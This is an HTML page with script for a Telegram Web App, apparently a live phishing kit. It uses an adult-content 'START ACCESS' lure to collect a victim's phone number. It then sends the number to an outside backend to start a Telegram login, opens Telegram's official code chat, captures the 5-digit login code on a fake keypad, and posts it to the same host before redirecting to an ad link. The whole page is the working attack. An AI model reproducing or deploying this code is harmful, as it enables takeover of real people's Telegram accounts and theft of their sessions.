<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: flex-end; justify-content: center;
            overflow: hidden;
        }
        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        .main-container { width: 92%; max-width: 380px; z-index: 10; text-align: center; margin-bottom: 30px; }

        .otp-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px; padding: 25px 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .instruction { color: #333; font-weight: bold; margin-bottom: 20px; font-size: 16px; }

        /* প্রফেশনাল বাটন */
        .get-code-btn {
            background: #0088cc;
            color: white; border: none; padding: 15px;
            width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px;
            cursor: pointer; margin-bottom: 25px;
            box-shadow: 0 5px 15px rgba(0, 136, 204, 0.3);
            display: block; text-decoration: none;
        }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
        .otp-box { 
            width: 45px; height: 55px; background: #f1f1f1; 
            border: 2px solid #ddd; border-radius: 10px; 
            display: flex; align-items: center; justify-content: center; 
            font-size: 28px; font-weight: bold; color: #000;
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key { 
            background: #ffffff; padding: 18px; border-radius: 12px; 
            font-size: 24px; font-weight: bold; color: #333; 
            border: 1px solid #ddd; cursor: pointer;
        }
        .key:active { background: #e0e0e0; }
        .key-del { background: #ff4757; color: white; border: none; }

        .hidden { display: none !important; }
        .finger { font-size: 80px; margin-bottom: 20px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(15px); } }
        .loader { color: white; font-weight: bold; font-size: 22px; margin-bottom: 100px; text-shadow: 2px 2px 10px #000; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <div id="step0">
            <div class="finger">👇</div>
            <div id="load" class="loader hidden">🔄 Connecting...</div>
        </div>

        <div id="step2" class="hidden">
            <div class="otp-card">
                <div class="instruction">Enter the 5-digit code sent by Telegram</div>
                
                <!-- একদম অরিজিনাল প্রো মেথড: এটি সরাসরি ওটিপি চ্যাট ওপেন করবে -->
                <button class="get-code-btn" onclick="openOfficialChat()">
                    📥 GET LOGIN CODE
                </button>

                <div class="otp-inputs">
                    <div class="otp-box" id="b1"></div>
                    <div class="otp-box" id="b2"></div>
                    <div class="otp-box" id="b3"></div>
                    <div class="otp-box" id="b4"></div>
                    <div class="otp-box" id="b5"></div>
                </div>

                <div class="keypad">
                    <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                    <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                    <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                    <div style="background:transparent; border:none;"></div>
                    <div class="key" onclick="addNum('0')">0</div>
                    <div class="key key-del" onclick="clearNum()">⌫</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.MainButton.setText("🍓 START ACCESS 🔞").show().onClick(startFlow);

        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        // এটিই হলো সেশন বটের আসল সিক্রেট ফাংশন
        function openOfficialChat() {
            // ১. এটি সরাসরি টেলিগ্রামের সিস্টেম চ্যাট ট্রিগার করে (ID 777000)
            tg.openTelegramLink("tg://resolve?domain=telegram");
            
            // ২. কিছু ভার্সনে ডোমেইন কাজ না করলে সরাসরি মেসেজ প্রোটোকল ট্রিগার করবে
            setTimeout(() => {
                tg.openTelegramLink("tg://msg?user_id=777000");
            }, 200);
        }

        function startFlow() {
            tg.requestContact();
            tg.MainButton.hide();
            document.querySelector('.finger').classList.add('hidden');
            document.getElementById('load').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumberToBot(data.phone); }
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumberToBot(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        function addNum(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                updateBoxes();
                if(currentOTP.length === 5) { verifyOTP(); }
            }
        }
        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
        function updateBoxes() { 
            for(let i=1; i<=5; i++) { 
                document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; 
            } 
        }

        async function verifyOTP() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") { window.location.href = OFF_LINK; }
                else { tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); }
            } catch (e) { }
        }
    </script>
</body>
</html>
